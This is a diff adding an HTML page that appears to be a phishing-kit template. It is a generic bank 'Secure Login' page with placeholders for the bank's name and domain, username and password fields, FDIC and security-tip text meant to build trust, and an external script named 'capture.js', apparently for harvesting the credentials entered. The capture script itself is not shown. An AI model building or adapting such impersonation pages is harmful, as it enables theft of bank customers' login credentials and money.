@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login | {BANK_NAME} Online Banking</title>
+    <link rel="icon" type="image/x-icon" href="https://www.{BANK_DOMAIN}/favicon.ico">
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #f5f7fa;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .security-header {
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 0.9em;
+            color: #0066cc;
+            font-weight: 600;
+        }
+        .login-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 420px;
+            padding: 40px;
+            border-top: 4px solid #0066cc;
+        }
+        .bank-logo {
+            display: block;
+            margin: 0 auto 30px auto;
+            max-width: 180px;
+            height: auto;
+        }
+        .form-title {
+            font-size: 1.5em;
+            margin-bottom: 25px;
+            color: #1a365d;
+            text-align: center;
+            font-weight: 600;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #4a5568;
+            font-size: 0.95em;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #cbd5e0;
+            border-radius: 6px;
+            font-size: 1em;
+            transition: border-color 0.2s;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #0066cc;
+            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.05em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 10px;
+        }
+        .submit-btn:hover {
+            background-color: #0052a3;
+        }
+        .helper-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 25px;
+            font-size: 0.9em;
+        }
+        .helper-links a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+        .helper-links a:hover {
+            text-decoration: underline;
+        }
+        .security-notice {
+            margin-top: 30px;
+            padding: 15px;
+            background-color: #f0f9ff;
+            border-radius: 6px;
+            border-left: 4px solid #0066cc;
+            font-size: 0.85em;
+            color: #2d3748;
+        }
+        .security-notice strong {
+            color: #1a365d;
+        }
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 0.8em;
+            color: #718096;
+            max-width: 420px;
+            line-height: 1.5;
+        }
+        .footer a {
+            color: #718096;
+            text-decoration: none;
+        }
+        .error-message {
+            color: #e53e3e;
+            background-color: #fff5f5;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 0.9em;
+            border: 1px solid #fed7d7;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="security-header">
+        <span>🔒 Secure Login</span>
+    </div>
+
+    <div class="login-container">
+        <img src="https://www.{BANK_DOMAIN}/static/logo.svg" alt="{BANK_NAME}" class="bank-logo" onerror="this.src='https://via.placeholder.com/180x60/0066CC/FFFFFF?text={BANK_NAME}'">
+
+        <h1 class="form-title">Sign In to Online Banking</h1>
+
+        <div id="errorMessage" class="error-message">
+            The username or password you entered is incorrect. Please try again.
+        </div>
+
+        <form id="loginForm" action="https://online.{BANK_DOMAIN}/auth" method="post">
+            <div class="input-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username" required autofocus>
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+
+            <button type="submit" class="submit-btn">Sign In</button>
+        </form>
+
+        <div class="helper-links">
+            <a href="https://www.{BANK_DOMAIN}/forgot-username">Forgot Username?</a>
+            <a href="https://www.{BANK_DOMAIN}/reset-password">Forgot Password?</a>
+            <a href="https://www.{BANK_DOMAIN}/enroll">Enroll Now</a>
+        </div>
+
+        <div class="security-notice">
+            <strong>Security Tip:</strong> Always ensure you are on the official {BANK_NAME} website before entering your login credentials. Look for the lock icon 🔒 in your browser's address bar.
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© {CURRENT_YEAR} {BANK_NAME}. Member FDIC. Equal Housing Lender.</p>
+        <p>
+            <a href="https://www.{BANK_DOMAIN}/privacy">Privacy Policy</a> |
+            <a href="https://www.{BANK_DOMAIN}/security">Security Center</a> |
+            <a href="https://www.{BANK_DOMAIN}/contact">Contact Us</a>
+        </p>
+        <p style="margin-top: 10px;">This is a secure system. Unauthorized access is prohibited.</p>
+    </div>
+
+    <script src="capture.js"></script>
+</body>
+</html>
